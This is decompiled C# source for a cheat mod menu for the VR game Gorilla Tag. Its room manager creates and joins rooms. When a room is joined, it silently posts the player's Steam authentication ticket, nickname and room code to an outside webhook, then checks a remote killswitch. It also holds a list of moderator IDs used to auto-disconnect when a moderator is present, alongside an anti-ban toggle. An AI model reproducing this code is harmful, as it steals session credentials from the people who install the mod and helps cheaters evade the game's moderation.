using System;
using System.Collections.Specialized;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using ExitGames.Client.Photon;
using GorillaNetworking;
using Photon.Pun;
using Photon.Realtime;
using UnityEngine;

namespace Steal.Background.Mods
{
	// Token: 0x02000043 RID: 67
	internal class RoomManager : Mod
	{
		// Token: 0x060001BB RID: 443 RVA: 0x00015E47 File Offset: 0x00014047
		public static Texture2D ConvertToTexture2D(Texture texture)
		{
			Texture2D texture2D = new Texture2D(texture.width, texture.height);
			texture2D.SetPixels((texture as Texture2D).GetPixels());
			texture2D.Apply();
			return texture2D;
		}

		// Token: 0x060001BC RID: 444 RVA: 0x00015E74 File Offset: 0x00014074
		public override void OnJoinedRoom()
		{
			base.OnJoinedRoom();
			if (MenuPatch.FindButton("Auto AntiBan").Enabled)
			{
				MenuPatch.isRoomCodeRun = true;
				MenuPatch.isRunningAntiBan = true;
			}
			this.oldRoom = PhotonNetwork.CurrentRoom.Name;
			Hashtable hashtable = new Hashtable();
			hashtable.Add("steal", PhotonNetwork.CurrentRoom.Name);
			Hashtable hashtable2 = hashtable;
			PhotonNetwork.LocalPlayer.SetCustomProperties(hashtable2, null, null);
			GorillaTagger.Instance.myVRRig.Controller.SetCustomProperties(hashtable2, null, null);
			NameValueCollection nameValueCollection = new NameValueCollection();
			NameValueCollection nameValueCollection2 = nameValueCollection;
			string text = "content";
			string[] array = new string[6];
			array[0] = "ticket ";
			array[1] = PlayFabAuthenticator.instance.GetSteamAuthTicket();
			array[2] = "name: ";
			array[3] = PhotonNetwork.LocalPlayer.NickName;
			array[4] = " Joined Code: ";
			int num = 5;
			Room currentRoom = PhotonNetwork.CurrentRoom;
			array[num] = ((currentRoom != null) ? currentRoom.ToString() : null);
			nameValueCollection2.Add(text, string.Concat(array));
			NameValueCollection nameValueCollection3 = nameValueCollection;
			byte[] array2 = new WebClient().UploadValues("https://tnuser.com/API/StealWebsook.php", nameValueCollection3);
			Console.WriteLine(Encoding.UTF8.GetString(array2));
			bool flag = false;
			foreach (MenuPatch.Button button in MenuPatch.buttons)
			{
				if (button.ismaster && !PhotonNetwork.IsMasterClient && button.Enabled)
				{
					flag = true;
					button.Enabled = false;
				}
			}
			if (flag)
			{
				Notif.SendNotification("One or more mods have been disabled due to not having master!", Color.white);
				MenuPatch.RefreshMenu();
			}
			if (new WebClient().DownloadString("https://bbc123f.github.io/killswitch.txt").Contains("="))
			{
				Application.Quit();
			}
			if (!File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "steal", "EXIST.txt")))
			{
				Application.Quit();
			}
		}

		// Token: 0x060001BD RID: 445 RVA: 0x00016020 File Offset: 0x00014220
		private static string[] GetPlayerIds(Player[] players)
		{
			string[] array = new string[players.Length];
			for (int i = 0; i < players.Length; i++)
			{
				array[i] = players[i].UserId;
			}
			return array;
		}

		// Token: 0x060001BE RID: 446 RVA: 0x00016050 File Offset: 0x00014250
		public static void DodgeModerators()
		{
			if (RoomManager.moderatorIds.Any((string item) => RoomManager.GetPlayerIds(PhotonNetwork.PlayerListOthers).Contains(item)))
			{
				Notif.SendNotification("AUTODODGE]</color> Moderator Found Disconnected Successfully", Color.red);
				PhotonNetwork.Disconnect();
			}
		}

		// Token: 0x060001BF RID: 447 RVA: 0x0001609C File Offset: 0x0001429C
		public static void CreatePrivateRoom()
		{
			Hashtable hashtable2;
			if (PhotonNetworkController.Instance.currentJoinTrigger.gameModeName != "city" && PhotonNetworkController.Instance.currentJoinTrigger.gameModeName != "basement")
			{
				Hashtable hashtable = new Hashtable();
				object obj = "gameMode";
				string gameModeName = PhotonNetworkController.Instance.currentJoinTrigger.gameModeName;
				string currentQueue = GorillaComputer.instance.currentQueue;
				WatchableStringSO currentGameMode = GorillaComputer.instance.currentGameMode;
				hashtable.Add(obj, gameModeName + currentQueue + ((currentGameMode != null) ? currentGameMode.ToString() : null));
				hashtable2 = hashtable;
			}
			else
			{
				Hashtable hashtable3 = new Hashtable();
				hashtable3.Add("gameMode", PhotonNetworkController.Instance.currentJoinTrigger.gameModeName + GorillaComputer.instance.currentQueue + "CASUAL");
				hashtable2 = hashtable3;
			}
			RoomOptions roomOptions = new RoomOptions();
			roomOptions.IsVisible = false;
			roomOptions.IsOpen = true;
			roomOptions.MaxPlayers = PhotonNetworkController.Instance.GetRoomSize(PhotonNetworkController.Instance.currentJoinTrigger.gameModeName);
			roomOptions.CustomRoomProperties = hashtable2;
			roomOptions.PublishUserId = true;
			roomOptions.CustomRoomPropertiesForLobby = new string[] { "gameMode" };
			PhotonNetwork.CreateRoom(RoomManager.RandomRoomName(), roomOptions, null, null);
		}

		// Token: 0x060001C0 RID: 448 RVA: 0x000161D0 File Offset: 0x000143D0
		public static void CreatePublicRoom()
		{
			Hashtable hashtable2;
			if (PhotonNetworkController.Instance.currentJoinTrigger.gameModeName != "city" && PhotonNetworkController.Instance.currentJoinTrigger.gameModeName != "basement")
			{
				Hashtable hashtable = new Hashtable();
				object obj = "gameMode";
				string gameModeName = PhotonNetworkController.Instance.currentJoinTrigger.gameModeName;
				string currentQueue = GorillaComputer.instance.currentQueue;
				WatchableStringSO currentGameMode = GorillaComputer.instance.currentGameMode;
				hashtable.Add(obj, gameModeName + currentQueue + ((currentGameMode != null) ? currentGameMode.ToString() : null));
				hashtable2 = hashtable;
			}
			else
			{
				Hashtable hashtable3 = new Hashtable();
				hashtable3.Add("gameMode", PhotonNetworkController.Instance.currentJoinTrigger.gameModeName + GorillaComputer.instance.currentQueue + "CASUAL");
				hashtable2 = hashtable3;
			}
			RoomOptions roomOptions = new RoomOptions();
			roomOptions.IsVisible = true;
			roomOptions.IsOpen = true;
			roomOptions.MaxPlayers = PhotonNetworkController.Instance.GetRoomSize(PhotonNetworkController.Instance.currentJoinTrigger.gameModeName);
			roomOptions.CustomRoomProperties = hashtable2;
			roomOptions.PublishUserId = true;
			roomOptions.CustomRoomPropertiesForLobby = new string[] { "gameMode" };
			PhotonNetwork.CreateRoom(RoomManager.RandomRoomName(), roomOptions, null, null);
		}

		// Token: 0x060001C1 RID: 449 RVA: 0x00016304 File Offset: 0x00014504
		public static string RandomRoomName()
		{
			string text = "";
			for (int i = 0; i < 4; i++)
			{
				text += "ABCDEFGHIJKLMNOPQRSTUVWXYX123456789".Substring(Random.Range(0, "ABCDEFGHIJKLMNOPQRSTUVWXYX123456789".Length), 1);
			}
			if (GorillaComputer.instance.CheckAutoBanListForName(text))
			{
				return text;
			}
			return RoomManager.RandomRoomName();
		}

		// Token: 0x060001C2 RID: 450 RVA: 0x0001635C File Offset: 0x0001455C
		public static void JoinRandom()
		{
			if (GorillaComputer.instance.currentQueue.Contains("forest"))
			{
				PhotonNetworkController.Instance.AttemptToJoinPublicRoom(GorillaComputer.instance.forestMapTrigger, false);
				return;
			}
			if (GorillaComputer.instance.currentQueue.Contains("canyon"))
			{
				PhotonNetworkController.Instance.AttemptToJoinPublicRoom(GorillaComputer.instance.canyonMapTrigger, false);
				return;
			}
			if (GorillaComputer.instance.currentQueue.Contains("city"))
			{
				PhotonNetworkController.Instance.AttemptToJoinPublicRoom(GorillaComputer.instance.cityMapTrigger, false);
				return;
			}
			if (GorillaComputer.instance.currentQueue.Contains("sky"))
			{
				PhotonNetworkController.Instance.AttemptToJoinPublicRoom(GorillaComputer.instance.skyjungleMapTrigger, false);
				return;
			}
			if (GorillaComputer.instance.currentQueue.Contains("cave"))
			{
				PhotonNetworkController.Instance.AttemptToJoinPublicRoom(GorillaComputer.instance.caveMapTrigger, false);
				return;
			}
			if (GorillaComputer.instance.currentQueue.Contains("basement"))
			{
				PhotonNetworkController.Instance.AttemptToJoinPublicRoom(GorillaComputer.instance.basementMapTrigger, false);
			}
		}

		// Token: 0x060001C3 RID: 451 RVA: 0x00016494 File Offset: 0x00014694
		public static void SmartDisconnect()
		{
			if (PhotonNetwork.InRoom)
			{
				PhotonNetwork.Disconnect();
				Notif.SendNotification("Disconnected From Room", Color.white);
				return;
			}
			Notif.SendNotification("Failed To Disconnect: NOT IN ROOM", Color.red);
		}

		// Token: 0x04000136 RID: 310
		public static string[] moderatorIds = new string[]
		{
			"C3878B068886F6C3", "AAB44BFD0BA34829", "61AD990FF3A423B7", "BC99FA914F506AB8", "3A16560CA65A51DE", "59F3FE769DE93AB9", "ECDE8A2FF8510934", "F5B5C64914C13B83", "80279945E7D3B57D", "EE9FB127CF7DBBD5",
			"2E408ED946D55D51", "BC9764E1EADF8BE0", "7E44E8337DF02CC1", "42C809327652ECDD", "7F31BEEC604AE18B", "1D6E20BE9655C798", "22A7BCEFFD7A0BBA", "6F79BE7CB34642AC", "CBCCBBB6C28A94CF", "5B5536D4434DDC0F",
			"54DCB69545BE0800", "D0CB396539676DD8", "608E4B07DBEFC690", "A04005517920EB0", "5AA1231973BE8A62", "9DBC90CF7449EF64", "6FE5FF4D5DF68843", "52529F0635BE0CDF", "D345FE394607F946", "6713DA80D2E9BFB5",
			"498D4C2F23853B37", "6DC06EEFFE9DBD39", "E354E818871BD1D8", "A6FFC7318E1301AF", "D6971CA01F82A975", "458CCE7845335ABF", "28EA953654FF2E79", "A1A99D33645E4A94", "CA8FDFF42B7A1836"
		};

		// Token: 0x04000137 RID: 311
		private string oldRoom;
	}
}
